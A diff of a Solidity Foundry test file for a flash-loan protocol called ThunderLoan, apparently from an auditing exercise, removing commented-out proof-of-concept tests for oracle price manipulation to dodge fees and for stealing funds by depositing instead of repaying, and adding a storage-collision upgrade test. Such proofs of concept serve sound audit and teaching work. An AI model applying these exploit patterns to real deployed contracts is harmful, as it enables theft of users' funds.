@@ -213,83 +213,6 @@ contract ThunderLoanTest is BaseTest {
         vm.stopPrank();
     }
 
-    // function test_OracleManipulation_ToIgnoreFees() public {
-    //     // 1. Setup Contracts
-    //     thunderLoan = new ThunderLoan();
-    //     tokenA = new ERC20Mock();
-    //     proxy = new ERC1967Proxy(address(thunderLoan), "");
-
-    //     BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
-    //     pf.createPool(address(tokenA));
-
-    //     address tswapPool = pf.getPool(address(tokenA));
-
-    //     thunderLoan = ThunderLoan(address(proxy));
-    //     thunderLoan.initialize(address(pf));
-
-    //     // Fund tswap
-    //     vm.startPrank(liquidityProvider);
-    //     tokenA.mint(liquidityProvider, 100e18);
-    //     tokenA.approve(address(tswapPool), 100e18);
-    //     weth.mint(liquidityProvider, 100e18);
-    //     weth.approve(address(tswapPool), 100e18);
-    //     BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
-    //     vm.stopPrank();
-
-    //     // Set allow token
-    //     vm.prank(thunderLoan.owner());
-    //     thunderLoan.setAllowedToken(tokenA, true);
-
-    //     // Add liquidity to ThunderLoan
-    //     vm.startPrank(liquidityProvider);
-    //     tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
-    //     tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
-    //     thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
-    //     vm.stopPrank();
-
-    //     // TSwap has 100 WETH & 100 tokenA
-    //     // ThunderLoan has 1,000 tokenA
-    //     // If we borrow 50 tokenA -> swap it for WETH (tank the price) -> borrow another 50 tokenA (do something) ->
-    //     // repay both
-    //     // We pay drastically lower fees
-
-    //     // here is how much we'd pay normally
-    //     uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(tokenA, 100e18);
-    //     console2.log("calculatedFeeNormal", calculatedFeeNormal);
-    //     // 296147410319118389
-
-    //     uint256 amountToBorrow = 50e18;
-    //     MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
-    //         address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
-    //     );
-
-    //     vm.startPrank(user);
-    //     tokenA.mint(address(flr), 100e18);
-    //     thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
-    //     vm.stopPrank();
-
-    //     uint256 attackFee = flr.feeOne() + flr.feeTwo();
-    //     console2.log("Attack fee is: ", attackFee);
-    //     assert(attackFee < calculatedFeeNormal);
-    // }
-
-    // function test_UseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
-    //     vm.startPrank(user);
-    //     uint256 amountToBorrow = 50e18;
-    //     uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
-
-    //     DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
-
-    //     tokenA.mint(address(dor), fee);
-
-    //     thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
-    //     dor.redeemMoney();
-
-    //     vm.stopPrank();
-
-    //     assertGt(tokenA.balanceOf(address(dor)), 50e18 + fee);
-    // }
-
     function test_UpgradeBreaks() public {
         uint256 feeBeforeUpgrade = thunderLoan.getFee();
         vm.startPrank(thunderLoan.owner());
@@ -453,6 +376,27 @@ contract ThunderLoanTest is BaseTest {
         uint256 dorBalanceAfter = tokenA.balanceOf(address(dor));
 
         assert(dorBalanceAfter > amountToBorrow + fee);
+    }
+
+    function testUpdrageCausesStorageCollison() public {
+        uint256 feeBeforeUpgrade = thunderLoan.getFee();
+
+        ThunderLoanUpgraded thunderLoanUpgraded = new ThunderLoanUpgraded();
+
+        vm.startPrank(thunderLoan.owner());
+
+        // upgrading the proxy
+        // pointing to new implementation
+        thunderLoan.upgradeToAndCall(address(thunderLoanUpgraded), "");
+
+        vm.stopPrank();
+
+        uint256 feeAfterUpgrade = thunderLoan.getFee();
+
+        console2.log("feeBefore", feeBeforeUpgrade);
+        console2.log("feeAfter ", feeAfterUpgrade);
+
+        assert(feeBeforeUpgrade != feeAfterUpgrade);
     }
 }
 
